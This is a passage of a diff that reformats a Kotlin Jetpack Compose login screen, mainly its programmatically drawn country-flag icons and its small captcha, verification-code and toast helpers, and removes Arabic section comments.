+                    (l.r.toLong() shl 16) or (l.g.toLong() shl 8) or l.b.toLong()
+                drawLine(Color(argb),
+                    Offset(l.x1 * w, l.y1 * h), Offset(l.x2 * w, l.y2 * h),
+                    strokeWidth = 1.2f * sx)
             }
-
             glyphs.forEachIndexed { i, gl ->
                 val px = (10f + i * 19f) * sx
                 val py = (26f + gl.dy) * sy
-
                 drawContext.canvas.save()
                 drawContext.canvas.translate(px, py)
                 drawContext.canvas.rotate(gl.rot)
@@ -1365,10 +1103,6 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // =================================================
-    // الأعلام (مرسومة برمجياً)
-    // =================================================
-
     @Composable
     fun FlagIcon(code: String, modifier: Modifier = Modifier) {
         Canvas(modifier = modifier.clip(RoundedCornerShape(3.dp))) {
@@ -1378,24 +1112,17 @@ class LoginActivity : ComponentActivity() {
                 "sa" -> {
                     drawRect(Color(0xFF165B33))
                     val stroke = h * 0.045f
-                    drawLine(Color.White, Offset(w*0.20f, h*0.38f),
-                        Offset(w*0.80f, h*0.38f), strokeWidth = stroke)
-                    drawLine(Color.White, Offset(w*0.22f, h*0.50f),
-                        Offset(w*0.78f, h*0.50f), strokeWidth = stroke)
-                    drawLine(Color.White, Offset(w*0.24f, h*0.62f),
-                        Offset(w*0.76f, h*0.62f), strokeWidth = stroke)
+                    drawLine(Color.White, Offset(w*0.20f, h*0.38f), Offset(w*0.80f, h*0.38f), strokeWidth = stroke)
+                    drawLine(Color.White, Offset(w*0.22f, h*0.50f), Offset(w*0.78f, h*0.50f), strokeWidth = stroke)
+                    drawLine(Color.White, Offset(w*0.24f, h*0.62f), Offset(w*0.76f, h*0.62f), strokeWidth = stroke)
                 }
                 "us" -> {
                     val stripe = h / 13f
                     for (i in 0 until 13) {
-                        drawRect(
-                            color = if (i % 2 == 0) Color(0xFFB22234) else Color.White,
-                            topLeft = Offset(0f, i * stripe),
-                            size = Size(w, stripe + 1f)
-                        )
+                        drawRect(color = if (i % 2 == 0) Color(0xFFB22234) else Color.White,
+                            topLeft = Offset(0f, i * stripe), size = Size(w, stripe + 1f))
                     }
-                    drawRect(Color(0xFF3C3B6E), topLeft = Offset.Zero,
-                        size = Size(w * 0.45f, stripe * 7f))
+                    drawRect(Color(0xFF3C3B6E), topLeft = Offset.Zero, size = Size(w * 0.45f, stripe * 7f))
                 }
                 "cn" -> {
                     drawRect(Color(0xFFDE2910))
@@ -1403,24 +1130,18 @@ class LoginActivity : ComponentActivity() {
                 }
                 "tw" -> {
                     drawRect(Color(0xFFFE0000))
-                    drawRect(Color(0xFF000095), topLeft = Offset.Zero,
-                        size = Size(w * 0.5f, h * 0.5f))
-                    drawCircle(Color.White, radius = h*0.12f,
-                        center = Offset(w*0.25f, h*0.25f))
-                    drawCircle(Color(0xFF000095), radius = h*0.08f,
-                        center = Offset(w*0.25f, h*0.25f))
+                    drawRect(Color(0xFF000095), topLeft = Offset.Zero, size = Size(w * 0.5f, h * 0.5f))
+                    drawCircle(Color.White, radius = h*0.12f, center = Offset(w*0.25f, h*0.25f))
+                    drawCircle(Color(0xFF000095), radius = h*0.08f, center = Offset(w*0.25f, h*0.25f))
                 }
                 "jp" -> {
                     drawRect(Color.White)
-                    drawCircle(Color(0xFFBC002D), radius = h*0.3f,
-                        center = Offset(w/2f, h/2f))
+                    drawCircle(Color(0xFFBC002D), radius = h*0.3f, center = Offset(w/2f, h/2f))
                 }
                 "tr" -> {
                     drawRect(Color(0xFFE30A17))
-                    drawCircle(Color.White, radius = h*0.3f,
-                        center = Offset(w*0.38f, h/2f))
-                    drawCircle(Color(0xFFE30A17), radius = h*0.25f,
-                        center = Offset(w*0.44f, h/2f))
+                    drawCircle(Color.White, radius = h*0.3f, center = Offset(w*0.38f, h/2f))
+                    drawCircle(Color(0xFFE30A17), radius = h*0.25f, center = Offset(w*0.44f, h/2f))
                     drawPath(starPath(w*0.6f, h/2f, h*0.13f, 180), Color.White)
                 }
                 "kr" -> {
@@ -1436,54 +1157,40 @@ class LoginActivity : ComponentActivity() {
                 }
                 "fr" -> {
                     drawRect(Color(0xFF0055A4), size = Size(w/3f, h))
-                    drawRect(Color.White, topLeft = Offset(w/3f, 0f),
-                        size = Size(w/3f, h))
-                    drawRect(Color(0xFFEF4135), topLeft = Offset(2f*w/3f, 0f),
-                        size = Size(w/3f, h))
+                    drawRect(Color.White, topLeft = Offset(w/3f, 0f), size = Size(w/3f, h))
+                    drawRect(Color(0xFFEF4135), topLeft = Offset(2f*w/3f, 0f), size = Size(w/3f, h))
                 }
                 "pt" -> {
                     drawRect(Color(0xFF046A38), size = Size(w*0.4f, h))
-                    drawRect(Color(0xFFDA291C), topLeft = Offset(w*0.4f, 0f),
-                        size = Size(w*0.6f, h))
-                    drawCircle(Color(0xFFFFE900), radius = h*0.16f,
-                        center = Offset(w*0.4f, h/2f))
+                    drawRect(Color(0xFFDA291C), topLeft = Offset(w*0.4f, 0f), size = Size(w*0.6f, h))
+                    drawCircle(Color(0xFFFFE900), radius = h*0.16f, center = Offset(w*0.4f, h/2f))
                 }
                 "pk" -> {
                     drawRect(Color(0xFF01411C))
                     drawRect(Color.White, size = Size(w*0.25f, h))
-                    drawCircle(Color.White, radius = h*0.28f,
-                        center = Offset(w*0.62f, h*0.45f))
-                    drawCircle(Color(0xFF01411C), radius = h*0.24f,
-                        center = Offset(w*0.68f, h*0.4f))
+                    drawCircle(Color.White, radius = h*0.28f, center = Offset(w*0.62f, h*0.45f))
+                    drawCircle(Color(0xFF01411C), radius = h*0.24f, center = Offset(w*0.68f, h*0.4f))
                 }
                 "ir" -> {
                     drawRect(Color(0xFF239F40), size = Size(w, h/3f))
-                    drawRect(Color.White, topLeft = Offset(0f, h/3f),
-                        size = Size(w, h/3f))
-                    drawRect(Color(0xFFDA0000), topLeft = Offset(0f, 2f*h/3f),
-                        size = Size(w, h/3f))
-                    drawCircle(Color(0xFFDA0000), radius = h*0.11f,
-                        center = Offset(w/2f, h/2f))
+                    drawRect(Color.White, topLeft = Offset(0f, h/3f), size = Size(w, h/3f))
+                    drawRect(Color(0xFFDA0000), topLeft = Offset(0f, 2f*h/3f), size = Size(w, h/3f))
+                    drawCircle(Color(0xFFDA0000), radius = h*0.11f, center = Offset(w/2f, h/2f))
                 }
                 "th" -> {
                     val s = h / 6f
                     drawRect(Color(0xFFA51931), size = Size(w, s))
-                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, s),
-                        size = Size(w, s))
-                    drawRect(Color(0xFF2D2A4A), topLeft = Offset(0f, 2f*s),
-                        size = Size(w, 2f*s))
-                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, 4f*s),
-                        size = Size(w, s))
-                    drawRect(Color(0xFFA51931), topLeft = Offset(0f, 5f*s),
-                        size = Size(w, s))
+                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, s), size = Size(w, s))
+                    drawRect(Color(0xFF2D2A4A), topLeft = Offset(0f, 2f*s), size = Size(w, 2f*s))
+                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, 4f*s), size = Size(w, s))
+                    drawRect(Color(0xFFA51931), topLeft = Offset(0f, 5f*s), size = Size(w, s))
                 }
                 else -> drawRect(Color(0xFF555555))
             }
         }
     }
 
-    private fun starPath(cx: Float, cy: Float, outerR: Float,
-                         startDeg: Int = -90): Path {
+    private fun starPath(cx: Float, cy: Float, outerR: Float, startDeg: Int = -90): Path {
         val innerR = outerR * 0.382f
         val path = Path()
         for (i in 0 until 10) {
@@ -1497,20 +1204,12 @@ class LoginActivity : ComponentActivity() {
         return path
     }
 
-    // =================================================
-    // مساعدات
-    // =================================================
-
     private fun newCaptchaCode(): String {
         val ch = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
-        return buildString {
-            repeat(4) { append(ch[Random.nextInt(ch.length)]) }
-        }
+        return buildString { repeat(4) { append(ch[Random.nextInt(ch.length)]) } }
     }
 
-    private fun newVerifyCode(): String {
-        return (100000 + Random.nextInt(900000)).toString()
-    }
+    private fun newVerifyCode(): String = (100000 + Random.nextInt(900000)).toString()
 
     private fun showToast(msg: String) {
         Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
